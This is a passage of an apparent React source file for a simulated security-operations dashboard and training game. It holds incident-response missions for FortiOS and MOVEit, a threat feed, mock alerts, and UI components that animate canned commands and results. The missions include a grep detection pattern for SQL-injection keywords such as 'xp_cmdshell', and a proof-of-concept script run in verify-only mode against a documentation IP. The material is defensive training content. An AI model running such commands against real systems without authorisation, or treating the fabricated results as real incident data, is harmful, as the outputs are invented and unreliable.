      { id:"p5", label:"Apply FortiOS patch to FGT-EDGE-02", tool:"FortiManager",      desc:"Deploy emergency patch to second firewall", cmd:"fortimanager upgrade device FGT-EDGE-02 --firmware fortios-7.0.15.out --schedule now", result:"FGT-EDGE-02 upgraded to 7.0.15. HA pair fully patched and synced.", completed:false },
      { id:"p6", label:"Verify remediation & test auth",     tool:"Pentest Tool",      desc:"Confirm the auth bypass is no longer exploitable", cmd:"python3 cve_2024_55591_poc.py --target 203.0.113.5 --verify-only",              result:"✓ MISSION COMPLETE — Auth bypass PATCHED. PoC returns 403. Both firewalls secure.", completed:false },
    ],
  },
  {
    id:"m6", title:"MOVEit SQL Injection Hunt",
    cve:"CVE-2023-34362", sev:"HIGH", xp:450, time:"35 min",
    category:"Threat Hunting",
    desc:"MOVEit Transfer SQL injection enabling unauthorized data access. CL0P ransomware group actively exploiting. Check if your file transfer server was compromised and hunt for web shells.",
    objectives:["Verify MOVEit version and exposure","Hunt for SQL injection in logs","Search for web shells","Identify exfiltrated data","Remediate and report"],
    steps:[
      { id:"p1", label:"Check MOVEit version & exposure",    tool:"Asset Mgmt / Shodan", desc:"Identify MOVEit Transfer version and verify internet exposure", cmd:"curl -sk https://moveit.corp.com/human.aspx | grep 'version'",             result:"MOVEit Transfer 2023.0.0 — VULNERABLE (patched: 2023.0.6). Internet-exposed.", completed:false },
      { id:"p2", label:"Hunt SQL injection in access logs",  tool:"Log Analysis",       desc:"Search IIS logs for MOVEit SQL injection patterns", cmd:"grep -E 'guestaccess|cmd=|exec|WAITFOR|xp_cmdshell' /var/log/iis/moveit.log | last 7d", result:"14 SQL injection attempts. 3 successful (HTTP 200 with large response bodies).", completed:false },
      { id:"p3", label:"Search for dropped web shells",      tool:"File Integrity + AV", desc:"Hunt for web shells planted via the SQL injection", cmd:"Find-WebShell -Path C:\\MOVEitTransfer\\wwwroot -Extensions .aspx,.ashx -Yara webshell_rules.yar", result:"FOUND: human2.aspx (38KB, modified 2025-03-07). Classic CL0P web shell variant.", completed:false },
      { id:"p4", label:"Remove web shell & clean access",    tool:"IR Kit",             desc:"Delete the web shell and remove all backdoor access", cmd:"Remove-Item C:\\MOVEitTransfer\\wwwroot\\human2.aspx; netstat -an | kill-sessions", result:"Web shell removed. 2 active backdoor sessions terminated.", completed:false },
      { id:"p5", label:"Identify exfiltrated files",         tool:"DLP + File Audit",   desc:"Determine scope of data access via the web shell", cmd:"Get-FileAuditLog -Host moveit.corp.com -Last 7d -Filter 'Read,Download' | Export",  result:"847 files accessed. Includes HR records (312), Finance docs (201), contracts (334).", completed:false },
      { id:"p6", label:"Apply MOVEit emergency patch",       tool:"MOVEit Updater",     desc:"Apply official vendor patch to close the SQL injection vulnerability", cmd:"moveit-updater apply 2023.0.6 --backup-first --notify-users",            result:"MOVEit 2023.0.6 installed. SQL injection CVE patched. Service restored.", completed:false },
      { id:"p7", label:"Notify legal & begin breach review", tool:"IR Platform",        desc:"Data was exfiltrated — legal, DPO, and CISO must be notified", cmd:"ir-notify --type DATA_BREACH --scope 847files --regulatory GDPR,HIPAA",    result:"✓ MISSION COMPLETE — Legal notified. 72h breach disclosure clock started. Patch applied.", completed:false },
    ],
  },
];

const FEED = [
  { ts:"14:38", sev:"CRITICAL", icon:"🚨", msg:"CISA KEV: CVE-2025-0282 (Ivanti) added — active exploitation confirmed, patch within 48h." },
  { ts:"14:21", sev:"HIGH",     icon:"⚠️",  msg:"APT-29 spear-phishing campaign targeting NATO affiliates — new IOCs pushed to TIP." },
  { ts:"13:55", sev:"CRITICAL", icon:"🔥",  msg:"BlackCat affiliate activity spike — 3 new healthcare victims confirmed today." },
  { ts:"13:30", sev:"MEDIUM",   icon:"📡",  msg:"NightHawk C2 variant detected — updated YARA rules deployed fleet-wide." },
  { ts:"12:58", sev:"MEDIUM",   icon:"🕵️",  msg:"Dark web: credential dump includes 4 addresses matching your email domain." },
  { ts:"12:22", sev:"LOW",      icon:"ℹ️",  msg:"Patch Tuesday: 6 critical CVEs — prioritize CVE-2025-21298 (CVSS 9.8)." },
  { ts:"11:44", sev:"LOW",      icon:"📝",  msg:"AlienVault OTX: 312 new IOCs published — BianLian ransomware group." },
];

const ENDPOINTS = [
  { host:"WS-EXEC-001", ip:"10.4.12.88",  os:"Win 11",   status:"ISOLATED",     risk:98, seen:"Now"  },
  { host:"SRV-DC-02",   ip:"10.1.0.2",    os:"Win 2022", status:"INVESTIGATING", risk:74, seen:"2m"   },
  { host:"WS-DEV-014",  ip:"10.2.8.14",   os:"Win 11",   status:"SUSPICIOUS",   risk:61, seen:"1m"   },
  { host:"SRV-WEB-01",  ip:"10.0.0.22",   os:"RHEL 9",   status:"ONLINE",        risk:20, seen:"30s"  },
  { host:"WS-FIN-033",  ip:"10.3.1.5",    os:"Win 10",   status:"ONLINE",        risk:15, seen:"45s"  },
  { host:"SRV-DB-01",   ip:"10.1.3.10",   os:"Ubuntu 22",status:"ONLINE",        risk:8,  seen:"1m"   },
];

const FALLBACK_CVES = [
  { id:"CVE-2025-21298", score:9.8, sev:"CRITICAL", pub:"2025-01-14", desc:"Windows OLE RCE — unauthenticated code execution via malicious Office attachment." },
  { id:"CVE-2025-0282",  score:9.0, sev:"CRITICAL", pub:"2025-01-08", desc:"Ivanti Connect Secure buffer overflow — pre-auth RCE, actively exploited in the wild." },
  { id:"CVE-2024-55591", score:9.6, sev:"CRITICAL", pub:"2025-01-14", desc:"FortiOS auth bypass — super-admin escalation via crafted WebSocket requests." },
  { id:"CVE-2025-23006",  score:9.8, sev:"CRITICAL", pub:"2025-01-22", desc:"SonicWall SMA pre-auth deserialization. CISA KEV — mass exploitation observed." },
  { id:"CVE-2025-24813", score:9.1, sev:"CRITICAL", pub:"2025-02-14", desc:"Apache Tomcat partial PUT RCE on unpatched servers." },
];

function makeAlerts() {
  const now = Date.now();
  const rows = [
    { sev:"CRITICAL", type:"Ransomware Execution",   src:"10.4.12.88",  dst:"10.4.12.0/24",  mitre:"T1486 – Data Encrypted",  sensor:"EDR-Prod-02" },
    { sev:"CRITICAL", type:"C2 Beacon Detected",     src:"10.0.3.201",  dst:"185.220.101.7", mitre:"T1071.001 – HTTP C2",     sensor:"FW-Edge-01"  },
    { sev:"HIGH",     type:"Pass-the-Hash Attempt",  src:"10.1.2.45",   dst:"10.1.2.100",    mitre:"T1550.002 – PtH",        sensor:"SIEM-Core"   },
    { sev:"HIGH",     type:"SSH Brute Force",         src:"92.118.39.22",dst:"10.0.0.22",     mitre:"T1110 – Brute Force",    sensor:"IDS-DMZ"     },
    { sev:"HIGH",     type:"Lateral Movement – RDP",  src:"10.1.5.33",   dst:"10.1.5.200",    mitre:"T1021.001 – RDP",        sensor:"NDR-Core"    },
    { sev:"MEDIUM",   type:"Suspicious PS Execution", src:"10.2.8.14",   dst:"—",             mitre:"T1059.001 – PowerShell", sensor:"EDR-Dev-01"  },
    { sev:"MEDIUM",   type:"DNS Tunneling Suspected", src:"10.2.9.77",   dst:"evil-redir.io", mitre:"T1071.004 – DNS",        sensor:"DNS-Guard"   },
    { sev:"MEDIUM",   type:"Failed MFA × 12",         src:"10.3.1.5",    dst:"Azure AD",      mitre:"T1078 – Valid Accounts", sensor:"CASB-01"     },
    { sev:"LOW",      type:"Port Scan Detected",      src:"10.5.0.33",   dst:"10.5.0.0/16",   mitre:"T1046 – Network Scan",   sensor:"IDS-Core"    },
    { sev:"LOW",      type:"Outbound to Tor Exit",    src:"10.0.7.144",  dst:"185.220.100.x", mitre:"T1090 – Proxy",          sensor:"FW-Edge-02"  },
    { sev:"LOW",      type:"Unsigned Driver Load",    src:"10.4.3.11",   dst:"—",             mitre:"T1547.006 – Kernel Mod", sensor:"EDR-Prod-01" },
    { sev:"INFO",     type:"New Service Installed",   src:"10.0.1.9",    dst:"—",             mitre:"T1543.003 – Win Svc",    sensor:"EDR-Dev-02"  },
  ];
  return rows.map((r, i) => ({
    ...r, id:`ALT-${8800+i}`,
    ts:new Date(now - i*284000 - Math.random()*90000),
    status: i < 2 ? "OPEN" : i < 5 ? "INVESTIGATING" : i < 8 ? "OPEN" : "CLOSED",
    analyst: i < 3 ? "Unassigned" : ["J. Reyes","M. Chen","A. Okafor","S. Patel"][i%4],
    neutralized: false,
  }));
}

function makeTrend() {
  const now = Date.now();
  return Array.from({ length:24 }, (_, i) => {
    const h = new Date(now-(23-i)*3600000).getHours();
    const base = 40+Math.sin(i*0.4)*15+Math.random()*20;
    return { time:h.toString().padStart(2,"0")+":00", events:Math.round(base*8), alerts:Math.round(base*1.4), critical:Math.round(base*0.12) };
  });
}

function makeHeatmap() {
  const DAYS=["Mon","Tue","Wed","Thu","Fri","Sat","Sun"];
  return DAYS.map((day,di)=>
    Array.from({ length:24 },(_,h)=>{
      const isWE=di>=5, isBiz=h>=8&&h<=18;
      let base=isWE?2:isBiz?14:4;
      if (di===3&&h>=14&&h<=19) base*=5;
      if (di===1&&h>=9&&h<=11) base*=3;
      return { day, h, v:Math.max(0,Math.round(base+(Math.random()-0.3)*base*0.7)) };
    })
  );
}

/* ═══════════════════════════════════════════════
   FULL-SCREEN BINARY RAIN
   — pre-fills canvas solid then overlays digits
═══════════════════════════════════════════════ */
function BinaryRain() {
  const ref = useRef(null);
  useEffect(()=>{
    const cv=ref.current, ctx=cv.getContext("2d");
    let W=cv.width=window.innerWidth, H=cv.height=window.innerHeight;
    const COL_W=16;
    const cols=Math.ceil(W/COL_W);
    const drops=Array.from({length:cols},()=>Math.floor(Math.random()*-80));

    // fill entire canvas with bg immediately so no black shows
    ctx.fillStyle=T.bg; ctx.fillRect(0,0,W,H);

    let raf;
    const draw=()=>{
      // slightly opaque bg wipe to create trail
      ctx.fillStyle="rgba(4,9,15,0.055)";
      ctx.fillRect(0,0,W,H);

      drops.forEach((y,i)=>{
        const bit=Math.random()>0.5?"1":"0";
        const rnd=Math.random();
        if (rnd>0.96) {
          // bright leader
          ctx.fillStyle="rgba(0,200,230,0.95)";
        } else if (rnd>0.88) {
          ctx.fillStyle="rgba(0,160,200,0.60)";
        } else {
          ctx.fillStyle=`rgba(0,90,130,${0.14+Math.random()*0.18})`;
        }
        ctx.font=`13px "JetBrains Mono",monospace`;
        ctx.fillText(bit, i*COL_W, y*15);

        // Reset when off screen
        if (y*15>H) drops[i]=Math.floor(Math.random()*-60);
        drops[i]+=0.6;
      });
      raf=requestAnimationFrame(draw);
    };
    draw();

    const onR=()=>{
      W=cv.width=window.innerWidth; H=cv.height=window.innerHeight;
      ctx.fillStyle=T.bg; ctx.fillRect(0,0,W,H);
    };
    window.addEventListener("resize",onR);
    return ()=>{ cancelAnimationFrame(raf); window.removeEventListener("resize",onR); };
  },[]);

  return (
    <canvas ref={ref} style={{ position:"fixed", inset:0, pointerEvents:"none", zIndex:0 }} />
  );
}

/* ═══════════════════════════════════════════════
   SHARED UI PRIMITIVES
═══════════════════════════════════════════════ */
const Dot=({color,pulse,size=7})=>(
  <span style={{ display:"inline-block",width:size,height:size,borderRadius:"50%",background:color,
    boxShadow:`0 0 6px ${color}`,flexShrink:0,animation:pulse?"pulse 1.8s ease-in-out infinite":"none" }} />
);

const SevBadge=({sev})=>(
  <span style={{ display:"inline-block",padding:"2px 7px",borderRadius:3,fontSize:10,
    fontFamily:"'JetBrains Mono',monospace",letterSpacing:1,
    color:SEV[sev]?.c||T.ts,background:SEV[sev]?.bg||"transparent",
    border:`1px solid ${(SEV[sev]?.c||T.ts)}55` }}>{sev}</span>
);

function Panel({title,accent,children,action,style:s={}}){
  return(
    <div style={{ background:T.panel,border:`1px solid ${T.border}`,borderRadius:5,overflow:"hidden",...s }}>
      <div style={{ display:"flex",alignItems:"center",justifyContent:"space-between",padding:"9px 15px",
        borderBottom:`1px solid ${T.border}`,background:T.surface }}>
        <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,letterSpacing:2,
          color:accent||T.ts,textTransform:"uppercase" }}>{title}</span>
        {action}
      </div>
      <div style={{ padding:"13px 15px" }}>{children}</div>
    </div>
  );
}

function StatCard({label,value,sub,color,icon,blink}){
  return(
    <div style={{ background:T.panel,border:`1px solid ${T.border}`,borderRadius:5,
      padding:"14px 16px",borderLeft:`3px solid ${color}` }}>
      <div style={{ display:"flex",justifyContent:"space-between",alignItems:"flex-start" }}>
        <div>
          <div style={{ fontSize:9,color:T.ts,letterSpacing:2,marginBottom:7,fontFamily:"'JetBrains Mono',monospace" }}>{label}</div>
          <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:30,fontWeight:700,color,lineHeight:1,
            textShadow:`0 0 18px ${color}44`,animation:blink?"blink 2s step-end infinite":"none" }}>{value}</div>
          {sub&&<div style={{ fontSize:10,color:T.ts,marginTop:5 }}>{sub}</div>}
        </div>
        <span style={{ fontSize:20,opacity:0.35 }}>{icon}</span>
      </div>
    </div>
  );
}

function LiveClock(){
  const [t,setT]=useState(new Date());
  useEffect(()=>{ const id=setInterval(()=>setT(new Date()),1000); return()=>clearInterval(id); },[]);
  return <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:11,color:T.ts }}>
    {t.toUTCString().replace("GMT","UTC")}
  </span>;
}

const ChartTip=({active,payload,label})=>{
  if(!active||!payload?.length) return null;
  return(
    <div style={{ background:T.card,border:`1px solid ${T.line}`,borderRadius:4,padding:"8px 12px",
      fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>
      <div style={{ color:T.ts,marginBottom:4 }}>{label}</div>
      {payload.map(p=><div key={p.name} style={{ color:p.color }}>{p.name}: {p.value?.toLocaleString()}</div>)}
    </div>
  );
};

const PieTip=({active,payload})=>{
  if(!active||!payload?.length) return null;
  const {name,value,fill}=payload[0].payload;
  return(
    <div style={{ background:"#0d192a",border:`2px solid ${fill}`,borderRadius:5,padding:"10px 14px",
      fontFamily:"'JetBrains Mono',monospace",pointerEvents:"none",zIndex:9999,
      boxShadow:`0 4px 24px rgba(0,0,0,0.8),0 0 14px ${fill}44` }}>
      <div style={{ color:fill,fontWeight:700,fontSize:13,marginBottom:4 }}>{name}</div>
      <div style={{ color:"#c8dff0",fontSize:12 }}>{value}%</div>
    </div>
  );
};

/* ═══════════════════════════════════════════════
   AUTH SCREEN
═══════════════════════════════════════════════ */
function AuthScreen(){
  const {login,register}=useAuth();
  const [mode,setMode]=useState("login");
  const [f,setF]=useState({username:"",email:"",password:"",confirm:""});
  const [err,setErr]=useState("");
  const [loading,setLoading]=useState(false);
  const upd=k=>e=>setF(p=>({...p,[k]:e.target.value}));

  const submit=()=>{
    setErr("");
    if(!f.email||!f.password){setErr("All fields required.");return;}
    setLoading(true);
    setTimeout(()=>{
      setLoading(false);
      if(mode==="login"){
        const r=login(f.email,f.password);
        if(!r.ok) setErr(r.msg);
      } else {
        if(!f.username){setErr("Username required.");return;}
        if(f.password!==f.confirm){setErr("Passwords do not match.");return;}
        if(f.password.length<6){setErr("Password must be 6+ chars.");return;}
        const r=register(f);
        if(!r.ok) setErr(r.msg);
      }
    },900);
  };

  const fields=mode==="login"
    ?[["Email","email","analyst@corp.internal"],["Password","password","••••••••"]]
    :[["Username","username","j.reyes"],["Email","email","analyst@corp.internal"],
      ["Password","password","••••••••"],["Confirm Password","confirm","••••••••"]];

  return(
    /* The BinaryRain canvas IS the background — it fills the whole viewport */
    <div style={{ minHeight:"100vh",display:"flex",alignItems:"center",justifyContent:"center",
      position:"relative",fontFamily:"'JetBrains Mono',monospace" }}>
      <BinaryRain />
      <div style={{ position:"relative",zIndex:10,width:420 }}>
        <div style={{ textAlign:"center",marginBottom:28 }}>
          <div style={{ fontSize:34,marginBottom:8 }}>🛡️</div>
          <div style={{ fontSize:22,fontWeight:700,color:T.cyan,letterSpacing:5,
            fontFamily:"'Rajdhani',sans-serif",textShadow:`0 0 30px ${T.cyanG}` }}>
            SENTINEL SOC
          </div>
          <div style={{ fontSize:9,color:T.ts,letterSpacing:5,marginTop:3 }}>SECURITY OPERATIONS CENTER v3.2</div>
        </div>

        <div style={{ background:"rgba(10,19,32,0.95)",border:`1px solid ${T.line}`,borderRadius:7,
          padding:"26px 28px",boxShadow:"0 0 60px rgba(0,184,217,0.08),0 20px 40px rgba(0,0,0,0.7)",
          backdropFilter:"blur(8px)" }}>
          <div style={{ display:"flex",background:T.surface,borderRadius:4,padding:3,marginBottom:22 }}>
            {[["login","Sign In"],["register","Create Account"]].map(([m,lbl])=>(
              <button key={m} onClick={()=>{setMode(m);setErr("");}}
                style={{ flex:1,padding:"7px 0",border:"none",borderRadius:3,cursor:"pointer",
                  fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:12,letterSpacing:2,
                  background:mode===m?T.cyan:"transparent",color:mode===m?T.bg:T.ts,transition:"all 0.2s" }}>
                {lbl.toUpperCase()}
              </button>
            ))}
          </div>

          {fields.map(([label,key,ph])=>(
            <div key={key} style={{ marginBottom:14 }}>
              <div style={{ fontSize:9,color:T.ts,letterSpacing:2,marginBottom:5 }}>{label.toUpperCase()}</div>
              <input value={f[key]} onChange={upd(key)} onKeyDown={e=>e.key==="Enter"&&submit()}
                type={key.includes("password")||key==="confirm"?"password":"text"} placeholder={ph}
                style={{ width:"100%",background:T.surface,border:`1px solid ${T.border}`,
                  borderRadius:4,padding:"9px 13px",color:T.tp,fontSize:12,outline:"none",
                  fontFamily:"inherit",boxSizing:"border-box" }} />
            </div>
          ))}

          {err&&<div style={{ fontSize:11,color:T.red,marginBottom:10,padding:"7px 10px",
            background:T.redG,borderRadius:3,border:`1px solid ${T.red}44` }}>{err}</div>}

          <button onClick={submit} disabled={loading}
            style={{ width:"100%",padding:"11px 0",marginTop:4,
              background:loading?T.border:T.cyan,border:"none",borderRadius:4,
              color:loading?T.ts:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
              fontSize:13,letterSpacing:4,cursor:loading?"not-allowed":"pointer",
              transition:"all 0.2s",boxShadow:loading?"none":`0 0 22px ${T.cyanG}` }}>
            {loading?"AUTHENTICATING…":mode==="login"?"▶ ACCESS SYSTEM":"▶ CREATE ACCOUNT"}
          </button>

          <div style={{ marginTop:14,fontSize:9,color:T.td,textAlign:"center",letterSpacing:1.5 }}>
            AUTHORIZED ACCESS ONLY · ALL SESSIONS MONITORED
          </div>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   PROFILE MODAL
═══════════════════════════════════════════════ */
function ProfileModal({onClose}){
  const {user,updateProfile}=useAuth();
  const [f,setF]=useState({ username:user.username||"",email:user.email||"",role:user.role||"",
    department:user.department||"",phone:user.phone||"",bio:user.bio||"",avatar:user.avatar||null });
  const [saved,setSaved]=useState(false);
  const [hov,setHov]=useState(false);
  const fileRef=useRef(null);
  const upd=k=>e=>setF(p=>({...p,[k]:e.target.value}));

  const handleAv=e=>{
    const file=e.target.files[0]; if(!file) return;
    const r=new FileReader();
    r.onload=ev=>setF(p=>({...p,avatar:ev.target.result}));
    r.readAsDataURL(file);
  };

  const save=()=>{
    updateProfile({...user,...f});
    setSaved(true);
    setTimeout(()=>{setSaved(false);onClose();},1100);
  };

  return(
    <div style={{ position:"fixed",inset:0,background:"rgba(4,9,15,0.85)",zIndex:500,
      display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(4px)" }}
      onClick={e=>e.target===e.currentTarget&&onClose()}>
      <div style={{ background:T.panel,border:`1px solid ${T.line}`,borderRadius:7,width:500,
        maxHeight:"90vh",overflowY:"auto",boxShadow:"0 0 60px rgba(0,0,0,0.9)" }}>
        <div style={{ padding:"15px 20px",borderBottom:`1px solid ${T.border}`,
          display:"flex",justifyContent:"space-between",alignItems:"center" }}>
          <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,letterSpacing:3,color:T.cyan }}>OPERATOR PROFILE</span>
          <button onClick={onClose} style={{ background:"none",border:"none",color:T.ts,cursor:"pointer",fontSize:17 }}>✕</button>
        </div>
        <div style={{ padding:"22px 24px" }}>
          <div style={{ textAlign:"center",marginBottom:24 }}>
            <div onClick={()=>fileRef.current.click()} onMouseEnter={()=>setHov(true)} onMouseLeave={()=>setHov(false)}
              style={{ width:90,height:90,borderRadius:"50%",margin:"0 auto 10px",background:T.card,
                border:`2px solid ${hov?T.cyan:T.ts+"44"}`,cursor:"pointer",overflow:"hidden",
                display:"flex",alignItems:"center",justifyContent:"center",position:"relative",
                boxShadow:hov?`0 0 20px ${T.cyanG}`:"none",transition:"all 0.2s" }}>
              {f.avatar?<img src={f.avatar} alt="av" style={{ width:"100%",height:"100%",objectFit:"cover" }}/>
                :<span style={{ fontSize:32,opacity:0.5 }}>👤</span>}
              {hov&&<div style={{ position:"absolute",inset:0,background:"rgba(0,184,217,0.3)",
                display:"flex",alignItems:"center",justifyContent:"center",fontSize:22 }}>📷</div>}
            </div>
            <div style={{ fontSize:9,color:T.ts,fontFamily:"'JetBrains Mono',monospace",letterSpacing:1 }}>CLICK TO UPLOAD PHOTO</div>
            <input ref={fileRef} type="file" accept="image/*" onChange={handleAv} style={{ display:"none" }}/>
          </div>

          {[["USERNAME","username"],["EMAIL","email"],["JOB TITLE","role"],
            ["DEPARTMENT","department"],["PHONE","phone"]].map(([label,key])=>(
            <div key={key} style={{ marginBottom:14 }}>
              <div style={{ fontSize:9,color:T.ts,letterSpacing:2,marginBottom:5,fontFamily:"'JetBrains Mono',monospace" }}>{label}</div>
              <input value={f[key]} onChange={upd(key)}
                style={{ width:"100%",background:T.surface,border:`1px solid ${T.border}`,
                  borderRadius:4,padding:"9px 13px",color:T.tp,fontSize:12,outline:"none",
                  fontFamily:"'JetBrains Mono',monospace",boxSizing:"border-box" }}/>
            </div>
          ))}
          <div style={{ marginBottom:18 }}>
            <div style={{ fontSize:9,color:T.ts,letterSpacing:2,marginBottom:5,fontFamily:"'JetBrains Mono',monospace" }}>NOTES / BIO</div>
            <textarea value={f.bio} onChange={upd("bio")} rows={3}
              style={{ width:"100%",background:T.surface,border:`1px solid ${T.border}`,
                borderRadius:4,padding:"9px 13px",color:T.tp,fontSize:12,outline:"none",
                resize:"vertical",fontFamily:"'JetBrains Mono',monospace",boxSizing:"border-box" }}/>
          </div>
          <div style={{ display:"flex",gap:10 }}>
            <button onClick={save}
              style={{ flex:1,padding:"10px 0",background:saved?T.green:T.cyan,border:"none",
                borderRadius:4,color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                fontSize:13,letterSpacing:3,cursor:"pointer",transition:"all 0.3s" }}>
              {saved?"✓ SAVED":"SAVE CHANGES"}
            </button>
            <button onClick={onClose}
              style={{ padding:"10px 18px",background:"transparent",border:`1px solid ${T.border}`,
                borderRadius:4,color:T.ts,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                fontSize:13,letterSpacing:2,cursor:"pointer" }}>CANCEL</button>
          </div>
          <div style={{ marginTop:14,padding:"10px 12px",background:T.surface,borderRadius:4 }}>
            <div style={{ fontSize:9,color:T.ts,fontFamily:"'JetBrains Mono',monospace",letterSpacing:2,marginBottom:5 }}>ACCOUNT INFO</div>
            <div style={{ fontSize:11,color:T.ts,fontFamily:"'JetBrains Mono',monospace",lineHeight:1.8 }}>
              <div>Member since: <span style={{ color:T.td }}>{new Date(user.createdAt||Date.now()).toLocaleDateString()}</span></div>
              <div>Clearance: <span style={{ color:T.cyan }}>TIER-2 ANALYST</span></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   INVESTIGATION MODAL
═══════════════════════════════════════════════ */
function InvestigationModal({alert:a, onClose, onNeutralize}){
  const [step,setStep]=useState(0);
  const [running,setRunning]=useState(false);
  const [output,setOutput]=useState("");
  const [done,setDone]=useState([]);
  const [neutralized,setNeutralized]=useState(false);

  const pb=PLAYBOOKS[a?.type];
  if(!pb) return null;

  const steps=pb.steps;
  const curStep=steps[step];
  const allDone=done.length===steps.length;

  const runStep=()=>{
    if(running||done.includes(step)) return;
    setRunning(true);
    setOutput("");
    let i=0;
    const txt=`> ${curStep.cmd}\n`;
    const interval=setInterval(()=>{
      setOutput(txt.slice(0,i));
      i++;
      if(i>txt.length) clearInterval(interval);
    },18);
    setTimeout(()=>{
      clearInterval(interval);
      setOutput(txt+"\n"+curStep.result);
      setRunning(false);
      setDone(p=>[...p,step]);
      setTimeout(()=>{
        if(step<steps.length-1) setStep(step+1);
      },800);
    },txt.length*18+400);
  };

  const doNeutralize=()=>{
    setNeutralized(true);
    setTimeout(()=>{ onNeutralize(a.id); onClose(); },1600);
  };

  const color=sc(a.sev);

  return(
    <div style={{ position:"fixed",inset:0,background:"rgba(4,9,15,0.88)",zIndex:600,
      display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(6px)" }}>
      <div style={{ background:T.panel,border:`1px solid ${color}55`,borderRadius:8,
        width:"min(900px,95vw)",maxHeight:"90vh",display:"flex",flexDirection:"column",
        boxShadow:`0 0 60px ${color}22,0 20px 60px rgba(0,0,0,0.9)` }}>
        
        {/* Header */}
        <div style={{ padding:"14px 20px",borderBottom:`1px solid ${T.border}`,
          display:"flex",alignItems:"center",justifyContent:"space-between",background:T.surface }}>
          <div style={{ display:"flex",alignItems:"center",gap:12 }}>
            <span style={{ fontSize:22 }}>{pb.icon}</span>
            <div>
              <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:17,fontWeight:700,color }}>
                INVESTIGATING: {a.type}
              </div>
              <div style={{ display:"flex",gap:8,alignItems:"center",marginTop:2 }}>
                <SevBadge sev={a.sev}/>
                <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.ts }}>{a.id} · {a.src}</span>
              </div>
            </div>
          </div>
          <button onClick={onClose} style={{ background:"none",border:"none",color:T.ts,cursor:"pointer",fontSize:18 }}>✕</button>
        </div>

        {neutralized ? (
          <div style={{ flex:1,display:"flex",flexDirection:"column",alignItems:"center",
            justifyContent:"center",padding:40 }}>
            <div style={{ fontSize:60,marginBottom:16 }}>✅</div>
            <div style={{ fontFamily:"'Orbitron',sans-serif",fontSize:22,fontWeight:700,
              color:T.green,letterSpacing:3,marginBottom:12,textAlign:"center" }}>
              THREAT NEUTRALIZED
            </div>
            <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:13,color:T.ts,
              textAlign:"center",maxWidth:500,lineHeight:1.7 }}>{pb.neutralizeMsg}</div>
          </div>
        ) : (
          <div style={{ flex:1,display:"grid",gridTemplateColumns:"240px 1fr",overflow:"hidden" }}>
            {/* Step List */}
            <div style={{ borderRight:`1px solid ${T.border}`,padding:"14px 0",overflowY:"auto",background:T.surface }}>
              <div style={{ padding:"0 14px 10px",fontFamily:"'JetBrains Mono',monospace",
                fontSize:9,color:T.ts,letterSpacing:2 }}>PLAYBOOK STEPS</div>
              {steps.map((s,i)=>{
                const isDone=done.includes(i);
                const isCur=i===step;
                return(
                  <div key={s.id} onClick={()=>{ if(isDone||i===step) setStep(i); }}
                    style={{ padding:"9px 14px",cursor:"pointer",display:"flex",alignItems:"center",gap:8,
                      background:isCur?`${color}18`:"transparent",
                      borderLeft:isCur?`3px solid ${color}`:"3px solid transparent",
                      borderBottom:`1px solid ${T.border}44` }}>
                    <div style={{ width:18,height:18,borderRadius:"50%",flexShrink:0,
                      background:isDone?T.green:isCur?color:T.border,
                      display:"flex",alignItems:"center",justifyContent:"center",fontSize:9,
                      color:isDone||isCur?T.bg:T.ts,fontWeight:700 }}>
                      {isDone?"✓":i+1}
                    </div>
                    <div>
                      <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,
                        color:isDone?T.green:isCur?color:T.ts,lineHeight:1.3 }}>{s.label}</div>
                      <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:8,color:T.td }}>{s.tool}</div>
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Step Detail */}
            <div style={{ display:"flex",flexDirection:"column",overflow:"hidden" }}>
              <div style={{ flex:1,padding:"18px 20px",overflowY:"auto" }}>
                <div style={{ marginBottom:16 }}>
                  <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:16,fontWeight:700,
                    color:T.tp,marginBottom:4 }}>{curStep.label}</div>
                  <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:11,color:T.ts,
                    padding:"8px 12px",background:T.surface,borderRadius:4,borderLeft:`2px solid ${T.border}` }}>
                    {curStep.desc}
                  </div>
                </div>

                {/* Tool badge */}
                <div style={{ marginBottom:12,display:"flex",alignItems:"center",gap:8 }}>
                  <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts,letterSpacing:1 }}>TOOL:</span>
                  <span style={{ padding:"3px 10px",background:T.cyanG,border:`1px solid ${T.cyan}55`,
                    borderRadius:3,fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.cyan }}>
                    {curStep.tool}
                  </span>
                </div>

                {/* Terminal */}
                <div style={{ background:"#020609",border:`1px solid ${T.line}`,borderRadius:5,overflow:"hidden" }}>
                  <div style={{ padding:"6px 12px",borderBottom:`1px solid ${T.line}`,
                    display:"flex",alignItems:"center",gap:6,background:T.surface }}>
                    {["#f03b3b","#f0c040","#00c875"].map(c=>(
                      <div key={c} style={{ width:10,height:10,borderRadius:"50%",background:c,opacity:0.7 }}/>
                    ))}
                    <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts,marginLeft:6 }}>
                      analyst@soc-terminal ~ %
                    </span>
                  </div>
                  <div style={{ padding:"12px 14px",minHeight:100,fontFamily:"'JetBrains Mono',monospace",
                    fontSize:12,color:T.green,lineHeight:1.7,whiteSpace:"pre-wrap",wordBreak:"break-all" }}>
                    {output || (done.includes(step)
                      ? <span style={{ color:T.ts }}>Step already executed. ✓</span>
                      : <span style={{ color:T.td }}>Click RUN STEP to execute…</span>)}
